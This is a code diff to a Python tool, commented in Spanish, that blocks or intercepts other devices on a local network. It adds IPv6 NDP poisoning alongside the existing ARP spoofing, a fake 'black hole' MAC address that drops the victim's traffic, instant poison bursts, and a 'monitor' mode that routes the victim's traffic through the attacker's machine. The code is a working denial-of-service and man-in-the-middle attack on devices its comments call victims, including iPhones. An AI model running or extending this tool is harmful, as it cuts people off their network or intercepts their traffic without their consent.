@@ -13,9 +13,22 @@ import threading
 import time
 from dataclasses import dataclass, field
 
-from scapy.all import ARP, send
+from scapy.all import (
+    ARP,
+    ICMPv6ND_NA,
+    IPv6,
+    ICMPv6NDOptDstLLAddr,
+    Ether,
+    send,
+    sendp,
+)
 
-from net import get_gateway_ip, get_mac
+from net import discover_ipv6, get_gateway_ip, get_ipv6_gateway, get_mac
+
+# MAC "agujero negro": al bloquear le decimos a la víctima que el gateway está
+# en esta MAC inexistente, así su tráfico se va a la nada (no pasa por nosotros,
+# bloqueo más limpio y sin cargar el PC). MAC localmente administrada y bogus.
+BLACKHOLE_MAC = "02:00:00:00:00:fe"
 
 
 @dataclass
@@ -26,15 +39,19 @@ class Target:
     thread: threading.Thread | None = None
     expires_at: float | None = None  # epoch; None = indefinido
     mode: str = "block"  # "block" (corta) | "monitor" (redirige, no corta)
+    ip6: str | None = None          # IPv6 link-local de la víctima (si hay)
 
 
 class BlockManager:
-    """Bloquea/desbloquea varios dispositivos por ARP spoofing en paralelo."""
+    """Bloquea/desbloquea varios dispositivos por ARP (+ NDP IPv6) en paralelo."""
 
-    def __init__(self, gateway_ip: str | None = None, interval: float = 2.0):
+    def __init__(self, gateway_ip: str | None = None, interval: float = 1.0):
         self.gateway_ip = gateway_ip or get_gateway_ip()
         self.gateway_mac = get_mac(self.gateway_ip)
         self.interval = interval
+        # IPv6 del router (link-local). Si hay IPv6, también lo envenenamos para
+        # que los equipos modernos (iPhones) no se escapen del bloqueo por IPv6.
+        self.gateway_ip6 = get_ipv6_gateway()
         self._targets: dict[str, Target] = {}
         self._lock = threading.Lock()
         if not self.gateway_mac:
@@ -64,6 +81,12 @@ class BlockManager:
             target = Target(ip=ip, mac=mac, mode=mode)
             if duration:
                 target.expires_at = time.time() + duration
+            # Para bloqueo, intentamos descubrir su IPv6 para cortar también NDP.
+            if mode == "block" and self.gateway_ip6:
+                target.ip6 = discover_ipv6(mac)
+            # Ráfaga inicial: envenena de una, sin esperar al primer ciclo, para
+            # que el corte sea inmediato.
+            self._poison_once(target, burst=5)
             target.thread = threading.Thread(
                 target=self._poison_loop, args=(target,), daemon=True
             )
@@ -121,27 +144,78 @@ class BlockManager:
             ]
 
     # ---- Interno -----------------------------------------------------
+    def _poison_once(self, target: Target, burst: int = 1) -> None:
+        """Un envío (o ráfaga) de envenenamiento IPv4 ARP + IPv6 NDP."""
+        # En bloqueo apuntamos al agujero negro; en monitoreo a NUESTRA MAC
+        # (hwsrc=None deja que scapy ponga la nuestra) para que el tráfico fluya.
+        hwsrc = BLACKHOLE_MAC if target.mode == "block" else None
+        # IPv4: a la víctima le mentimos sobre el gateway, y al gateway sobre ella.
+        send(ARP(op=2, pdst=target.ip, psrc=self.gateway_ip,
+                 hwdst=target.mac, hwsrc=hwsrc), count=burst, verbose=0)
+        send(ARP(op=2, pdst=self.gateway_ip, psrc=target.ip,
+                 hwdst=self.gateway_mac, hwsrc=hwsrc), count=burst, verbose=0)
+        # IPv6 (solo bloqueo): envenena NDP para que no se escape por IPv6.
+        if target.mode == "block" and target.ip6 and self.gateway_ip6:
+            self._ndp_poison(target, BLACKHOLE_MAC, burst)
+
+    def _ndp_poison(self, target: Target, lladdr: str, burst: int) -> None:
+        """Envenena la cache NDP: víctima<->router IPv6 apuntan a `lladdr`."""
+        try:
+            # A la víctima: "el router IPv6 (gateway6) está en lladdr".
+            sendp(
+                Ether(dst=target.mac)
+                / IPv6(src=self.gateway_ip6, dst=target.ip6)
+                / ICMPv6ND_NA(tgt=self.gateway_ip6, R=1, S=0, O=1)
+                / ICMPv6NDOptDstLLAddr(lladdr=lladdr),
+                count=burst, verbose=0,
+            )
+            # Al router: "la víctima (ip6) está en lladdr".
+            sendp(
+                Ether(dst=self.gateway_mac)
+                / IPv6(src=target.ip6, dst=self.gateway_ip6)
+                / ICMPv6ND_NA(tgt=target.ip6, R=0, S=0, O=1)
+                / ICMPv6NDOptDstLLAddr(lladdr=lladdr),
+                count=burst, verbose=0,
+            )
+        except Exception:
+            pass
+
     def _poison_loop(self, target: Target) -> None:
         while not target.stop.is_set():
-            # A la víctima: "el gateway soy yo"
-            send(ARP(op=2, pdst=target.ip, psrc=self.gateway_ip,
-                     hwdst=target.mac), verbose=0)
-            # Al gateway: "la víctima soy yo"
-            send(ARP(op=2, pdst=self.gateway_ip, psrc=target.ip,
-                     hwdst=self.gateway_mac), verbose=0)
+            self._poison_once(target)
             target.stop.wait(self.interval)
 
     def _restore(self, target: Target, count: int = 5) -> None:
         if not target.mac or not self.gateway_mac:
             return
-        # Restaura a la víctima con la MAC real del gateway
+        # IPv4: restaura a víctima y gateway con las MAC reales.
         send(ARP(op=2, pdst=target.ip, psrc=self.gateway_ip,
                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),
              count=count, verbose=0)
-        # Restaura al gateway con la MAC real de la víctima
         send(ARP(op=2, pdst=self.gateway_ip, psrc=target.ip,
                  hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target.mac),
              count=count, verbose=0)
+        # IPv6: si envenenamos NDP, corrige la cache con las MAC reales.
+        if target.ip6 and self.gateway_ip6:
+            try:
+                # A la víctima: el router IPv6 vuelve a estar en su MAC real.
+                sendp(
+                    Ether(dst=target.mac)
+                    / IPv6(src=self.gateway_ip6, dst=target.ip6)
+                    / ICMPv6ND_NA(tgt=self.gateway_ip6, R=1, S=0, O=1)
+                    / ICMPv6NDOptDstLLAddr(lladdr=self.gateway_mac),
+                    count=count, verbose=0,
+                )
+                # Al router: la víctima vuelve a estar en su MAC real.
+                sendp(
+                    Ether(dst=self.gateway_mac)
+                    / IPv6(src=target.ip6, dst=self.gateway_ip6)
+                    / ICMPv6ND_NA(tgt=target.ip6, R=0, S=0, O=1)
+                    / ICMPv6NDOptDstLLAddr(lladdr=target.mac),
+                    count=count, verbose=0,
+                )
+            except Exception:
+                pass
 
 
 if __name__ == "__main__":
